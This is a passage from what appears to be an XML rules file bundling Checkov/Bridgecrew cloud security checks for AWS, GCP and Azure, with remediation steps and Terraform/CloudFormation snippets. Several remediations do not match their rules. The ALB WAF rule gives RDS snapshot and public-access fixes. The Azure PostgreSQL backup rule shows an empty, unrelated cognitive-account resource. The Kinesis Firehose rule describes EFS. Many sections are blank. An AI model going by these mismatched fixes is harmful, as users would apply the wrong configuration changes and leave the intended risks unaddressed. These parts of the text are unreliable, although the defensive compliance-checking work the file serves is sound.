<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Ensure that all your public AWS Application Load Balancer are integrated with the Web Application Firewall (AWS WAF) service to protect against application-layer attacks. An Application Load Balancer functions at the application layer, the seventh layer of the Open Systems Interconnection (OSI) model. After the load balancer receives a request, it evaluates the listener rules in priority order to determine which rule to apply, and then selects a target from the target group for the rule action. You can configure listener rules to route requests to different target groups based on the content of the application traffic. Routing is performed independently for each target group, even when a target is registered with multiple target groups.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/rds" target="_self">Amazon RDS console</a>.</li>
<li>On the navigation pane, click <strong>Snapshots</strong>.</li>
<li>Select the <em>snapshot</em> to encrypt.</li>
<li>Navigate to <strong>Snapshot Actions</strong>, select <strong>Copy Snapshot</strong>.</li>
<li>Select your <strong>Destination Region</strong>, then enter your <strong>New DB Snapshot Identifier</strong>.</li>
<li>Set <strong>Enable Encryption</strong> to <strong>Yes</strong>.</li>
<li>Select your <strong>Master Key</strong> from the list, then select <strong>Copy Snapshot</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_db_instance</li>
<li><strong>Argument</strong>: publicly_accessible</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_rds_cluster.default.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_rds_cluster.default.tf">resource "aws_db_instance" "default" {
  ...
+ publicly_accessible   = false
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::RDS::DBInstance</li>
<li><strong>Argument</strong>: Properties.PubliclyAccessible</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: 'AWS::RDS::DBInstance'
    Properties:
      ...
+     PubliclyAccessible: false
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/public_2' target='_blank'> https://docs.bridgecrew.io/docs/public_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/public_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_211</key>
    <name>Ensure AWS RDS uses a modern CaCert</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-rds-does-not-use-a-modern-cacert"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-rds-does-not-use-a-modern-ca-cert"></div>AWS RDS does not use a modern CaCert</div><a aria-label="Skip link to AWS RDS does not use a modern CaCert" class="heading-anchor-icon fa fa-anchor" href="#aws-rds-does-not-use-a-modern-cacert"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-rds-uses-a-modern-cacert' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-rds-uses-a-modern-cacert</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-rds-uses-a-modern-cacert' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_255</key>
    <name>Ensure AWS DLM-cross region schedules are encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-dlm-cross-region-schedules-are-not-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-dlm-cross-region-schedules-are-not-encrypted"></div>AWS DLM-cross region schedules are not encrypted</div><a aria-label="Skip link to AWS DLM-cross region schedules are not encrypted" class="heading-anchor-icon fa fa-anchor" href="#aws-dlm-cross-region-schedules-are-not-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-dlm-cross-region-schedules-are-encrypted' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-dlm-cross-region-schedules-are-encrypted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-dlm-cross-region-schedules-are-encrypted' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_227</key>
    <name>Ensure AWS Key Management Service (KMS) key is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-key-management-service-kms-key-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-key-management-service-kms-key-is-disabled"></div>AWS Key Management Service (KMS) key is disabled</div><a aria-label="Skip link to AWS Key Management Service (KMS) key is disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-key-management-service-kms-key-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-key-management-service-kms-key-is-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-key-management-service-kms-key-is-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-key-management-service-kms-key-is-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_102</key>
    <name>Ensure GCP Cloud Run services are not anonymously or publicly accessible</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-cloud-run-services-are-anonymously-or-publicly-accessible"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-cloud-run-services-are-anonymously-or-publicly-accessible"></div>GCP Cloud Run services are anonymously or publicly accessible</div><a aria-label="Skip link to GCP Cloud Run services are anonymously or publicly accessible" class="heading-anchor-icon fa fa-anchor" href="#gcp-cloud-run-services-are-anonymously-or-publicly-accessible"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Cloud Run services are fully managed serverless environments used to develop and deploy containerized applications. In GCP, Cloud Run services support a wide variety of authentication methods to execute (invoke) the container. One of those methods is based to the usage of two special IAM principals: <em>allUsers</em> and <em>allAuthenticatedUsers</em>. When those IAM principals have access to the Cloud Run service - anyone on the internet can execute or access the Cloud Run service.</p>
<p>We recommend you ensure that neither anonymous or public access to Cloud Run services are allowed.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To remove anonymous or public access to your Cloud Run service:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/run" target="_self">Cloud Run</a>.</li>
<li>View your service's <em>Service details</em> page by clicking on your <strong>Service Name</strong>.</li>
<li>Select the <strong>PERMISSIONS</strong> tab.</li>
<li>To remove a specific role assignment, select <strong>allUsers</strong> or <strong>allAuthenticatedUsers</strong>, and then click <strong>Delete</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To remove anonymous or public access to your Cloud Run service execute the following command:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">gcloud run services remove-iam-policy-binding SERVICE-NAME \
    --member=MEMBER-TYPE \
    --role=ROLE
</code></pre></div></div>
<p>Replace <strong>SERVICE-NAME</strong> with your Cloud Run service name. Replace <strong>MEMBER-TYPE</strong> with the member you want to delete (either <strong>allUsers</strong> or <strong>allAuthenticatedUsers</strong>). Replace <strong>ROLE</strong> the IAM member's assigned role.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>
<p><strong>Resource</strong>: google_cloud_run_service_iam_binding</p>
</li>
<li>
<p><strong>Field</strong>: members</p>
</li>
<li>
<p><strong>Resource</strong>: google_cloud_run_service_iam_member</p>
</li>
<li>
<p><strong>Field</strong>: member</p>
</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_cloud_run_service_iam_binding" "public_binding" {
  location = google_cloud_run_service.default.location
  service = google_cloud_run_service.default.name
  role = "roles/run.invoker"

  members = [
-    "allUsers",
-    "allAuthenticatedUsers",
  ]
}

resource "google_cloud_run_service_iam_member" "public_member" {
  location = google_cloud_run_service.default.location
  service = google_cloud_run_service.default.name
  role = "roles/run.invoker"

-  member = "allUsers"
-  member = "allAuthenticatedUsers"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-cloud-run-service-is-not-anonymously-or-publicly-accessible' target='_blank'> https://docs.bridgecrew.io/docs/ensure-cloud-run-service-is-not-anonymously-or-publicly-accessible</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-cloud-run-service-is-not-anonymously-or-publicly-accessible' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_157</key>
    <name>Ensure Azure PostgreSQL Flexible Server enables geo-redundant backups</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-postgresql-flexible-server-does-not-enable-geo-redundant-backups"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-postgre-sql-flexible-server-does-not-enable-geo-redundant-backups"></div>Azure PostgreSQL Flexible Server does not enable geo-redundant backups</div><a aria-label="Skip link to Azure PostgreSQL Flexible Server does not enable geo-redundant backups" class="heading-anchor-icon fa fa-anchor" href="#azure-postgresql-flexible-server-does-not-enable-geo-redundant-backups"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {
 
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-postgresql-flexible-server-enables-geo-redundant-backups' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-postgresql-flexible-server-enables-geo-redundant-backups</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-postgresql-flexible-server-enables-geo-redundant-backups' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_205</key>
    <name>Ensure AWS AMI launch permissions are limited</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-ami-launch-permissions-are-not-limited"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-ami-launch-permissions-are-not-limited"></div>AWS AMI launch permissions are not limited</div><a aria-label="Skip link to AWS AMI launch permissions are not limited" class="heading-anchor-icon fa fa-anchor" href="#aws-ami-launch-permissions-are-not-limited"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-ami-launch-permissions-are-limited' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-ami-launch-permissions-are-limited</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-ami-launch-permissions-are-limited' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_161</key>
    <name>Ensure Azure Spring Cloud API Portal is enabled for HTTPS</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-spring-cloud-api-portal-is-not-enabled-for-https"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-spring-cloud-api-portal-is-not-enabled-for-https"></div>Azure Spring Cloud API Portal is not enabled for HTTPS</div><a aria-label="Skip link to Azure Spring Cloud API Portal is not enabled for HTTPS" class="heading-anchor-icon fa fa-anchor" href="#azure-spring-cloud-api-portal-is-not-enabled-for-https"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-spring-cloud-api-portal-is-enabled-for-https' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-spring-cloud-api-portal-is-enabled-for-https</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-spring-cloud-api-portal-is-enabled-for-https' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_266</key>
    <name>Ensure AWS RDS DB snapshot uses Customer Managed Keys (CMKs)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-rds-db-snapshot-does-not-use-customer-managed-keys-cmks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-rds-db-snapshot-does-not-use-customer-managed-keys-cm-ks"></div>AWS RDS DB snapshot does not use Customer Managed Keys (CMKs)</div><a aria-label="Skip link to AWS RDS DB snapshot does not use Customer Managed Keys (CMKs)" class="heading-anchor-icon fa fa-anchor" href="#aws-rds-db-snapshot-does-not-use-customer-managed-keys-cmks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies database snapshots that were not encrypted with KMS. It is a best practice to manage your own encryption keys for all storage volumes and snapshots.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>Changing the encryption method cannot be done for existing snapshots. Instead, create a new snapshot and add the CMK encryption.</p>
<ol>
<li>Open the Amazon RDS console.</li>
<li>In the navigation pane, choose Databases.</li>
<li>Choose the DB instance for which you want to create a manual snapshot.</li>
<li>Create a manual snapshot for your DB instance.</li>
<li>In the navigation pane, choose Snapshots.</li>
<li>Select the manual snapshot that you created.</li>
<li>Choose Actions, and then choose Copy Snapshot.</li>
<li>Under Encryption, select Enable Encryption.</li>
<li>For AWS KMS Key, choose the new encryption key that you want to use.</li>
<li>Choose Copy snapshot.</li>
<li>Restore the copied snapshot.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_db_snapshot_copy</li>
<li><strong>Argument:</strong> kms_key_id</li>
</ul>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-Go theme-light" data-lang="Go" name="">resource "aws_db_snapshot_copy" "pass" {
  source_db_snapshot_identifier = aws_db_snapshot.example.db_snapshot_arn
  target_db_snapshot_identifier = "testsnapshot1234-copy"
+  kms_key_id= aws_kms_key.example.id
}
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-rds-db-snapshot-uses-customer-managed-keys-cmks' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-rds-db-snapshot-uses-customer-managed-keys-cmks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-rds-db-snapshot-uses-customer-managed-keys-cmks' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_82</key>
    <name>Ensure GCP KMS keys are protected from deletion</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-kms-keys-are-not-protected-from-deletion"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-kms-keys-are-not-protected-from-deletion"></div>GCP KMS keys are not protected from deletion</div><a aria-label="Skip link to GCP KMS keys are not protected from deletion" class="heading-anchor-icon fa fa-anchor" href="#gcp-kms-keys-are-not-protected-from-deletion"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-kms-keys-are-protected-from-deletion' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-kms-keys-are-protected-from-deletion</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-kms-keys-are-protected-from-deletion' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_241</key>
    <name>Ensure AWS Kinesis Firehose Delivery Streams are encrypted with CMK</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-kinesis-firehose-delivery-streams-are-not-encrypted-with-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-kinesis-firehose-delivery-streams-are-not-encrypted-with-cmk"></div>AWS Kinesis Firehose Delivery Streams are not encrypted with CMK</div><a aria-label="Skip link to AWS Kinesis Firehose Delivery Streams are not encrypted with CMK" class="heading-anchor-icon fa fa-anchor" href="#aws-kinesis-firehose-delivery-streams-are-not-encrypted-with-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Elastic File Systems (EFSs) which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your EFS data. It gives you full control over the encrypted data.</p>
